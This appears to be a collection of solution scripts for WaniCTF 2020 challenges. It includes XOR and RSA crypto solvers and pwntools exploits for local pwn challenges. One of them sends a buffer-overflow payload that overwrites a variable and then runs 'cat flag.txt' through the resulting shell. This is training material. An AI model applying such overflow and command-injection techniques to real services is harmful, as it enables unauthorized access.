# crypto

## exclusive

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/exclusive

```python
#!/usr/bin/env python3
def encrypt(s: bytes, t: bytes) -> bytes:
    result = b""
    for ss, tt in zip(s, t):
        result += int.to_bytes(ss ^ tt)
    return result


ct = open("./output.txt").readline().strip()
key_start = bytes.fromhex("070e02")
flag_start = b"FLA"
key = encrypt(key_start, flag_start) * 19
print(encrypt(ct.encode("latin-1"), key))
```

## veni_vidi

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/veni_vidi

ROT13

## basic_rsa

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/basic_rsa

```zsh
docker build -t basic_rsa .
docker run -itd --rm --name basic_rsa -p 50000:50000 basic_rsa
```

```zsh
docker stop basic_rsa
docker rmi basic_rsa
```

```python
#!/usr/bin/env python3
from pwn import context, log, remote
# context.log_level = "debug"
io = remote("::1", 50000)
# ----------------------------------------


def read_value(names: tuple[str, ...] | list[str]) -> tuple[int, ...]:
    vals = []
    for name in tuple(names):
        io.recvuntil(f"{name} = ".encode())
        val = int(io.recvline(drop=True), 10)
        log.info("%s=%d", name, val)
        vals.append(val)
    return tuple(vals)


# ----------------------------------------
p, q = read_value(("p", "q"))
n = p*q
log.success(f"{n=}")
io.sendlineafter(b" > ", str(n).encode())
# ----------------------------------------
m, e, n = read_value(("m", "e", "n"))
c = pow(m, e, n)
log.success(f"{c=}")
io.sendlineafter(b" > ", str(c).encode())
# ----------------------------------------
p, q, e, c = read_value(("p", "q", "e", "c"))
n = p*q
phi = (p-1)*(q-1)
d = pow(e, -1, phi)
m = pow(c, d, n)
log.success(f"{m=}")
io.sendlineafter(b" > ", str(m).encode())
# ----------------------------------------
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}").decode())
# ----------------------------------------
io.interactive()
```

# pwn

## 01-netcat

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/01-netcat

```python
#!/usr/bin/env python3
from pwn import log, remote
io = remote("::1", 9001)
io.recvuntil(b"congratulation!\n")
io.sendline(b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
io.close()
```

## 02-var-rewrite

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/02-var-rewrite

```python
#!/usr/bin/env python3
from pwn import context, log, remote
context.log_level = "debug"
io = remote("::1", 9002)
io.sendlineafter(b"What's your name?: ", b"Y"*(0x16-0xc)+b"WANI")
io.sendlineafter(b"Congratulation!", b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
io.close()
```
